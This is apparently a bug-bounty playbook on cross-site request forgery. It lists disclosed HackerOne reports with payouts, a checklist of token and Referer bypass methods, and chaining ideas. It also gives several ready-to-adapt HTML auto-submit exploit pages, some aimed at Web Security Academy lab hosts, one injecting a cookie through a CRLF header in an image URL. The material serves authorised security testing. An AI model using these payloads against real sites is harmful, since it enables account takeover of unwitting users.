# Real-World Playbook — CSRF

**Class:** `csrf` · **Coverage-matrix tier:** 1 · **Hunter2:** /csrf · tools/csrf_scanner.py · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)

## Why it pays (real bounty signal)
Top disclosed CSRF reports peak at **$10,000**. Rewarded across: Acronis, Coinbase, Dropbox, Enjin, GitHub, GitHub Security Lab, GitLab, HackerOne.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **CSRF protection bypass in GitHub Enterprise management console** — GitHub, $10,000 · 151👍 · [1497169](https://hackerone.com/reports/1497169)
- **Argo CD CSRF leads to Kubernetes cluster compromise** — Internet Bug Bounty, $4,660 · 34👍 · [2326194](https://hackerone.com/reports/2326194)
- **CSRF on /api/graphql allows executing mutations through GET requests** — GitLab, $3,370 · 86👍 · [1122408](https://hackerone.com/reports/1122408)
- **Periscope iOS app CSRF in follow action due to deeplink** — X / xAI, $2,940 · 58👍 · [805073](https://hackerone.com/reports/805073)
- **Slack integration setup lacks CSRF protection** — HackerOne, $2,500 · 149👍 · [170552](https://hackerone.com/reports/170552)
- **CSRF token validation system is disabled on Stripe Dashboard** — Stripe, $2,500 · 86👍 · [1493437](https://hackerone.com/reports/1493437)
- **CSRF protection bypass on TikTok Webcast Endpoints** — TikTok, $2,500 · 79👍 · [1543234](https://hackerone.com/reports/1543234)
- **CSRF possible when SOP Bypass/UXSS is available** — HackerOne, $2,500 · 11👍 · [103787](https://hackerone.com/reports/103787)
- **CodeQL query for finding CSRF vulnerabilities in Spring applications** — GitHub Security Lab, $1,800 · 4👍 · [785120](https://hackerone.com/reports/785120)
- **Exfiltrate GDrive access token using CSRF** — Dropbox, $1,728 · 32👍 · [1468010](https://hackerone.com/reports/1468010)
- **Periscope android app deeplink leads to CSRF in follow action** — X / xAI, $1,540 · 224👍 · [583987](https://hackerone.com/reports/583987)
- **Revocation API Token by Bypassing The XSRF Token** — Enjin, $1,500 · 59👍 · [2312217](https://hackerone.com/reports/2312217)
- **SQL Injection on /webApp/sijoitustalousuk email-parameter + potential lack of CSRF Token (viestinta.lahitapiola.fi)** — LocalTapiola, $1,350 · 18👍 · [191601](https://hackerone.com/reports/191601)
- **Chaining Bugs: Leakage of CSRF token which leads to Stored XSS and Account Takeover (xs1.tribalwars.cash)** — InnoGames, $1,100 · 186👍 · [604120](https://hackerone.com/reports/604120)
- **CSRF on TikTok Ads Portal** — TikTok, $1,000 · 23👍 · [1087436](https://hackerone.com/reports/1087436)
- **Leaking CSRF token over HTTP resulting in CSRF protection bypass** — Coinbase, $1,000 · 6👍 · [15412](https://hackerone.com/reports/15412)
- **Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** — Shopify, $800 · 48👍 · [1271944](https://hackerone.com/reports/1271944)
- **PUT Based CSRF via Client Side Path Traversal + Cookie Bomb on Acronis Cloud** — Acronis, $600 · 76👍 · [1860380](https://hackerone.com/reports/1860380)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

### CSRF bybass methods
- NO csrf token
- weak csrf token
- check content type
- check referer header
- chnage POST to GET or GET to post

### CSRF token bybass methods
- reomving ANI-csrf token
- NO check for the users token
- weak token
- Reasuable token
- change request method
- Guessable token
- Bybass referer

### method attacks
- remove referer header and send request and check response
- remove original header and send request and check response
- remove csrf  token and send request and check response



### Basic method no defenses
- the request
```
POST /myaccount/changeemail
HOST:


email=....
```

- the exploit
```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>

```
### CSRF where token validation depends on token being present
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
-THE exploit

```html
<form action="" method="POST">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token validation depends on request method
- the request
```
POST /myaccount/changeemail
HOST:


email=....&csrftoken=.....
```
- TIPS: reomve the csrf token
- Tips: change request TO GET in CSRF payloads
-THE exploit

```html
<form action="" method="GET">
<input type="hidden" name="email" value="">
</form>
<script>
 document.forms[0].submit();
</script>
```

### CSRF where token is not tied to user session
- steps                                                                                                                                                                     
1- create two accounts                                                                                                                                                                     
2- go to the first account and change email we will change                                                                                                                                                                     
3- go to second account and try intersept change email then drop request , copy the csrf token                                                                                                                                                                     
4- go to the first account and put csrf token(second account) and try change email is valid or not


### csrf bypass via method override
```
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="" method="GET">
   <input type="hidden" name="_method" value="POST">
   <input type="hidden" name="email" value="">
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```
### CSRF where token is duplicated in cookie
```html
<html>
<body>
   <script>history.pushState(' ',' ','/')</script>
   <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
   <input type="hidden" name="email" value="a@gmail.com"/>
   <input type="hidden" name="csrf" value="fake"/>
   <input type="submit" value="submit request"/>
   </form>
   <img src="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
</html>
```
### CSRF where Referer validation depends on header being present
```html
<html>
<head>
   <meta name="referrer" content="no-referrer" >
</head>
<body>
   <script>history.pushState(' ', ' ' ,'/')</script>
   <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

### CSRF with broken Referer validation
```html
<html>
<body>
   <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
   <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="a@gmail.com">
   <input type="submit" value="submit" >
   </form>
   <script>
   document.forms[0].submit();
   </script>
</body>
</html>
```

## Chaining — always ask "what does this unlock?"
- CSRF on email/password change → ATO
- Login CSRF → victim uses attacker account → data capture
- SameSite=None + no token → cross-site state change

## Hunter2 wiring
- **Run:** `/csrf · tools/csrf_scanner.py`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
